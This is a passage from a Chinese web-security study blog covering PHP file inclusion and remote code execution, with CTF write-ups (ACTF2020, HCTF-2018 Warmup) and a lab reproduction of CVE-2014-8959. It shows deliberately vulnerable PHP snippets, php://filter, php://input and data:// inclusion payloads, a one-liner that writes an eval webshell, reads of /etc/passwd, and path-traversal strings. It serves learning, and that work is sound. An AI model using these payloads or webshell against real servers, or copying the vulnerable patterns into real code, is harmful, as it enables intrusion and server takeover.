language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="http://127.0.0.1/?file=http://127.0.0.1/1.txt">http://127.0.0.1/?file=http://127.0.0.1/1.txt</a>?</p><p><a href="http://127.0.0.1/?file=http://127.0.0.1/1.txt%23">http://127.0.0.1/?file=http://127.0.0.1/1.txt%23</a></p><p>原理：</p><p><a href="http://127.0.0.1/1.txt?.html">http://127.0.0.1/1.txt?.html</a></p><p><a href="http://127.0.0.1/1.txt#.html">http://127.0.0.1/1.txt#.html</a></p><p>加了问号或者#号（%23编码就是#号），再访问链接显示的还是原来的页面</p><h4 id="协议流绕过"><a href="#协议流绕过" class="headerlink" title="协议流绕过"></a>协议流绕过</h4><p>php支持的协议</p><p><img src="/2023/012220963/107.PNG" alt="107"></p><p>使用代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="php协议"><a href="#php协议" class="headerlink" title="php协议"></a>php协议</h5><p><strong>php://filter</strong></p><p>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。</p><p><strong>读取文件：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=index.php#读取某个网页源码，获取被注释掉的flag(常用)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/103.PNG" alt="103"></p><p>得到的是base64编码的字符串，解码即可查看源码</p><p><strong>读取上级目录文件：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=../../../a.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>读取其他文件：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=F:\b.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>php://input</strong></p><p>将post请求中的数据作为PHP代码执行，回显出现在header中</p><p>访问：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/?file=php://input</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发送post请求，请求内容为要执行的PHP代码</p><p><img src="/2023/012220963/104.PNG" alt="104"></p><p>写入木马的php代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]); phpinfo(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h5><p>访问本地文件系统，所有语言都支持，file协议需要传入绝对路径（完整路径）。</p><p>读取windows文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">//D:/a.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="http://127.0.0.1/?file=file://D:/a.txt">http://127.0.0.1?file=file://D:/a.txt</a></p><p>读取linux文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">///etc/passwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="http://127.0.0.1/?file=file:///etc/passwd">http://127.0.0.1?file=file:///etc/passwd</a></p><h5 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h5><p>读取数据流</p><ul><li><p>allow_url_fopen ：on</p></li><li><p>allow_url_include：on</p></li></ul><p>执行php代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">data://text/plaindata://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php<span class="token operator">%</span><span class="token number">20</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>eg:<a href="http://127.0.0.1/?file=data://text/plaindata://text/plain">http://127.0.0.1?file=data://text/plaindata://text/plain</a>,<?php%20phpinfo()?></p><p>以base64的形式，执行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>   base64编码=>  PD9waHAgcGhwaW5mbygpPz4=    data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>eg:<a href="http://127.0.0.1/?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p><h3 id="实例练习"><a href="#实例练习" class="headerlink" title="实例练习"></a>实例练习</h3><h4 id="DVWA靶场File-Inclusion"><a href="#DVWA靶场File-Inclusion" class="headerlink" title="DVWA靶场File Inclusion"></a>DVWA靶场File Inclusion</h4><ul><li>allow_url_fopen:on</li><li>allow_url_include:on</li></ul><p>靶场为安装，待定</p><h4 id="ACTF2020-Include"><a href="#ACTF2020-Include" class="headerlink" title="ACTF2020 Include"></a>ACTF2020 Include</h4><p>使用php协议中的php://filter协议读取网页源码，解码base64,找到被注释的flag</p><p><img src="/2023/012220963/105.PNG" alt="105"></p><h4 id="HCTF-2018-Warmup-暂未做"><a href="#HCTF-2018-Warmup-暂未做" class="headerlink" title="HCTF-2018-Warmup(暂未做)"></a>HCTF-2018-Warmup(暂未做)</h4><p>代码审计</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>   <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>           <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>           <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>  <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要判断：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$page</span>不为空并且为字符串<span class="token variable">$page</span>在白名单中，直接返回<span class="token constant boolean">true</span>处理过的<span class="token variable">$_page</span>在白名单中，直接返回<span class="token constant boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>主要代码分析：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>    <span class="token variable">$page</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># mb_strpos($page . '?', '?') 查找字符串第一次出现?的位置</span><span class="token comment"># mb_substr 从字符串中截取部分，截取字符串开始至第一次出现?的部分</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>file<span class="token operator">=</span>source<span class="token operator">.</span>php<span class="token operator">?</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>经过mb_substr函数处理过的结果：source.php</p><p>最终include文件 source.php?/../../../../ffffllllaaaagggg</p><p>payload2:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>file<span class="token operator">=</span>source<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">253</span>F<span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="CVE-2014-8959-phpMyAdmin任意文件包含"><a href="#CVE-2014-8959-phpMyAdmin任意文件包含" class="headerlink" title="CVE-2014-8959 phpMyAdmin任意文件包含"></a>CVE-2014-8959 phpMyAdmin任意文件包含</h4><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p><p>漏洞利用有两个前提：</p><ol><li><p>能登陆phpMyAdmin，满足phpmyadmin的安全检查</p></li><li><p>需要截断，需要满足下面的要求之一</p><ul><li><p>PHP的版本需要小于 5.3.4 且gpc关闭</p></li><li><p>利用长文件名截断</p></li></ul></li></ol><p>环境：vulfocus/phpmyadmin-cve_2014_8959:latest</p><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">docker pull vulfocus&#x2F;phpmyadmin-cve_2014_8959:latestdocker run -d -p 8080:80 vulfocus&#x2F;phpmyadmin-cve_2014_8959:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>漏洞复现：</strong></p><p>测试账号：pmatest:pmatest</p><p>漏洞url:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//&lt;IP>/pma/gis_data_editor.php?</span>token<span class="token operator">=</span>effa7667f41b469bde9c43d6e814f9a4<span class="token operator">&amp;&amp;</span>gis_data<span class="token punctuation">[</span>gis_type<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token number">1.</span>gif<span class="token operator">%</span><span class="token number">00</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>phpMyAdmin地址：<a href="http://ip:port/pma">http://ip:port/pma</a></p><p>1、token可以在登录后在url中获取</p><p>2、访问的同时post参数 a=phpinfo(); // 任意php代码</p><p><img src="/2023/012220963/106.PNG" alt="106"></p><p>(hacker 有问题，没测试post传参)</p><p><strong>注：</strong>此漏洞可以实现任意文件包含</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul><li>固定引用文件的扩展名</li><li>固定引用文件的名称</li><li>WAF</li></ul><h2 id="RCE代码-amp-命令执行漏洞"><a href="#RCE代码-amp-命令执行漏洞" class="headerlink" title="RCE代码&amp;命令执行漏洞"></a>RCE代码&amp;命令执行漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>RCE：<strong>Remote Command/Code Execute</strong>，远程代码/命令执行。</p><p>在Web应用中有时候程序员会使用代码调用代码或调用系统命令。</p><p>如果应用在执行以上操作时，没有考虑用户是否能控制这个字符串的话，将造成代码执行漏洞或者命令执行漏洞</p><h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p>代码执行危害：根据服务器语言不同，可导致PHP、Java、Python等任意代码执行</p><p>命令执行危害：导致任意<strong>系统命令</strong>执行（getshell）</p><h4 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h4><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>eval($c)：eval函数会把$c当做php代码执行。</p><p>访问： <a href="http://127.0.0.1/?c=phpinfo()">http://127.0.0.1?c=phpinfo()</a>; <strong>注意带分号</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用代码执行去写入一个木马文件：</p><p>写入木马的代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">fputs(fopen('a.php','w'),'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http://127.0.0.1?c=fputs(fopen('a.php','w'),'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h4><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>system($c)：system函数会把$c当做系统命令执行。</p><p>访问：</p><p><a href="http://127.0.0.1/?c=ipconfig">http://127.0.0.1/?c=ipconfig</a></p><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><ul><li>用户可控变量</li><li>漏洞函数</li></ul><h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><p>怎么找RCE：根据网站应用不同来查找</p><ul><li><p>白盒测试：</p><ul><li>代码审计</li></ul></li><li><p>黑盒测试：</p><ul><li><p>漏扫工具</p></li><li><p>nday漏洞</p></li><li><p>手动测试</p></li></ul></li></ul><h3 id="RCE危险函数"><a href="#RCE危险函数" class="headerlink" title="RCE危险函数"></a>RCE危险函数</h3><p>php中命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()</p><p>php中代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h5><p>system — 执行外部程序，并且显示输出</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h5><p>exec — 执行一个外部程序</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h5><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h5><p>popen — 打开进程文件指针</p><p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// $r = popen("ping 127.0.0.1","r");</span><span class="token keyword">echo</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h5><p>passthru — 执行外部程序并且显示原始输出</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h5><p>pcntl_exec — 在当前进程空间执行指定程序</p><p>Linux中常用，可以用于反弹shell</p><h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><p>把字符串作为PHP代码执行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('whoami');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h5><p>PHP5：<strong>assert</strong>(mixed $assertion , string $description = ?): bool</p><p>PHP7：<strong>assert</strong>(mixed $assertion , Throwable $exception = ?): bool</p><p>assert — 检查一个断言是否为 false</p><p>如果 assertion 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('ipconfig');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h5><p>preg_replace — 执行一个正则表达式的搜索和替换</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"(.*)"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"abc"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter 